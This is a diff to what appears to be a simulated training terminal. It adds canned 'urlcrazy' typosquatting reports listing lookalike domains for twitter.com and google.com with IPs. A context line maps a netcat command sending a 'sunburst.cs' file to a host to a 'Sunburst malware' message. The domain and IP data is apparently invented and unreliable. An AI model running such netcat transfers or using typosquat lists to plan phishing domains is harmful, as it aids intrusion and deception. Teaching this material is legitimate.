@@ -302,6 +302,113 @@ initializeDatabaseConnection()
 
                 'nc 192.168.1.100 63329 < sunburst.cs': () => `Downloading and executing Sunburst malware...`,
                 'help-module4': () => `Available Module 4 Commands:\n- nc 192.168.1.100 63329 < sunburst.cs\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
+
+                'urlcrazy twitter.com': () => `
+URLCrazy Domain Report
+Domain    : twitter.com
+Keyboard  : qwerty
+At        : 2024-03-20 15:32:54 -0400
+# Please wait. 2046 hostnames to process
+
+Typo Type              Typo Domain                       IP               Country 
+--------------------------------------------------------------------------------------------
+Original               twitter.com                       104.244.42.1     UNITED STATES (US)  
+Character Omission     titter.com                        104.21.44.196    UNITED STATES (US)  
+Character Omission     twiter.com                        199.59.148.10    UNITED STATES (US)   
+Character Omission     twitte.com                        173.236.211.166  UNITED STATES (US)         
+Character Omission     twitter.cm                        104.247.81.54    CANADA (CA)                 
+Character Omission     twitter.co                        3.64.163.50      UNITED STATES (US)    
+Character Omission     twittr.com                                                         
+Character Omission     twtter.com                                                         
+Character Repeat       ttwitter.com                      95.211.117.215   NETHERLANDS (NL)    
+Character Repeat       twiitter.com                                                    
+Character Repeat       twitteer.com                      103.224.182.241  AUSTRALIA (AU) 
+Character Repeat       twitterr.com                      103.224.182.239  AUSTRALIA (AU) 
+Character Repeat       twittter.com                      199.59.150.39    UNITED STATES (US) 
+Character Repeat       twwitter.com                      199.59.243.225   UNITED STATES (US) 
+Character Swap         tiwtter.com                                                                       
+Character Swap         twitetr.com                       192.198.80.150   UNITED STATES (US) 
+Character Swap         twittre.com                       69.162.80.59     UNITED STATES (US)
+Character Swap         twtiter.com                       192.198.80.147   UNITED STATES (US)
+Character Swap         wtitter.com                       69.162.80.56     UNITED STATES (US)
+Character Replacement  rwitter.com                       104.247.82.50    CANADA (CA)
+Character Replacement  teitter.com                       103.224.182.241  AUSTRALIA (AU) 
+Character Replacement  tqitter.com                       199.59.243.225   UNITED STATES (US)
+Character Replacement  twirter.com                       15.197.142.173   UNITED STATES (US) 
+Character Replacement  twitrer.com                       172.67.150.7     UNITED STATES (US)  
+Character Replacement  twittee.com                       193.243.189.83   GERMANY (DE) 
+Character Replacement  twittet.com                       95.211.219.66    NETHERLANDS (NL) 
+Character Replacement  twittrr.com                                                          
+Character Replacement  twittwr.com                       47.254.33.193    UNITED STATES (US)
+Character Replacement  twityer.com                       3.33.130.190     UNITED STATES (US)
+Character Replacement  twiyter.com                       172.98.192.37    UNITED STATES (US)
+Character Replacement  twotter.com                       5.61.57.250      UNITED KINGDOM (GB)
+Character Replacement  twutter.com                       103.224.182.246  AUSTRALIA (AU) 
+Double Replacement     twirrer.com                       199.59.243.225   UNITED STATES (US)
+Double Replacement     twiyyer.com                       199.59.243.225   UNITED STATES (US)
+Character Insertion    trwitter.com                      162.210.196.171  UNITED STATES (US)
+Character Insertion    tweitter.com                      69.162.80.62     UNITED STATES (US)
+Character Insertion    twiotter.com                      104.247.82.50    CANADA (CA)`,
+            'urlcrazy google.com': () => `
+URLCrazy Domain Report
+Domain    : google.com
+Keyboard  : qwerty
+At        : 2024-03-20 15:38:52 -0400
+# Please wait. 2025 hostnames to process
+
+Typo Type              Typo Domain                      IP               Country        
+-------------------------------------------------------------------------------------------
+Original               google.com                       142.250.191.174  UNITED STATES (US) 
+Character Omission     gogle.com                        142.251.32.4     UNITED STATES (US)
+Character Omission     googe.com                        162.243.10.151   UNITED STATES (US) 
+Character Omission     googl.com                        172.217.0.164    UNITED STATES (US) 
+Character Omission     google.cm                        172.217.1.99     UNITED STATES (US) 
+Character Omission     google.co                        142.250.190.46   UNITED STATES (US)  
+Character Omission     goole.com                        217.160.0.201    GERMANY (DE)       
+Character Repeat       ggoogle.com                      142.250.191.228  UNITED STATES (US) 
+Character Repeat       googgle.com                                                          
+Character Repeat       googlee.com                      172.217.4.36     UNITED STATES (US) 
+Character Repeat       googlle.com                      104.21.83.75     UNITED STATES (US)
+Character Repeat       gooogle.com                      142.251.32.4     UNITED STATES (US)
+Character Swap         gogole.com                       172.217.5.4      UNITED STATES (US)
+Character Swap         googel.com                       142.250.191.164  UNITED STATES (US) 
+Character Swap         goolge.com                       142.250.190.100  UNITED STATES (US) 
+Character Swap         ogogle.com                       142.250.191.228  UNITED STATES (US) 
+Character Replacement  foogle.com                       64.111.126.107   UNITED STATES (US) 
+Character Replacement  giogle.com                                                          
+Character Replacement  goigle.com                                                           
+Character Replacement  goofle.com                       37.48.65.136     NETHERLANDS (NL)    
+Character Replacement  googke.com                                                            
+Character Replacement  googlr.com                       142.250.191.228  UNITED STATES (US)
+Character Replacement  googlw.com                                                            
+Character Replacement  goohle.com                       47.254.33.193    UNITED STATES (US) 
+Character Replacement  gopgle.com                                                           
+Character Replacement  gpogle.com                       74.63.241.30     UNITED STATES (US) 
+Character Replacement  hoogle.com                       15.197.142.173   UNITED STATES (US) 
+Double Replacement     giigle.com                       78.41.204.36     NETHERLANDS (NL)   
+Double Replacement     gppgle.com                       142.250.191.100  UNITED STATES (US)  
+Character Insertion    gfoogle.com                                                          
+Character Insertion    ghoogle.com                                                          
+Character Insertion    goiogle.com                                                          
+Character Insertion    googfle.com                      104.247.81.53    CANADA (CA)         
+Character Insertion    googhle.com                                                         
+Character Insertion    googler.com                                                          
+Character Insertion    googlew.com                      107.161.23.204   UNITED STATES (US)
+Character Insertion    googlke.com                      107.161.23.204   UNITED STATES (US)
+Character Insertion    gooigle.com                                                          
+Character Insertion    goopgle.com                      69.162.80.53     UNITED STATES (US)
+Character Insertion    gopogle.com                      107.161.23.204   UNITED STATES (US)
+Missing Dot            googlecom.com                    172.217.4.68     UNITED STATES (US)
+Missing Dot            wwwgoogle.com                    142.250.190.4    UNITED STATES (US)
+Insert Dash            g-oogle.com                                                          
+Insert Dash            go-ogle.com                      66.96.149.22     UNITED STATES (US)
+Insert Dash            goo-gle.com                                                          
+Insert Dash            goog-le.com                      74.208.236.69    UNITED STATES (US)
+Insert Dash            googl-e.com
+Insert Dash            google-.com
+Singular or Pluralise  googles.com
+Vowel Swap             gaagle.cam                       162.255.119.247  UNITED STATES (US)`,
+            'help-module5': () => `Available Module 5 Commands:\n- urlcrazy twitter.com\n- urlcrazy google.com\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
             };
 
 
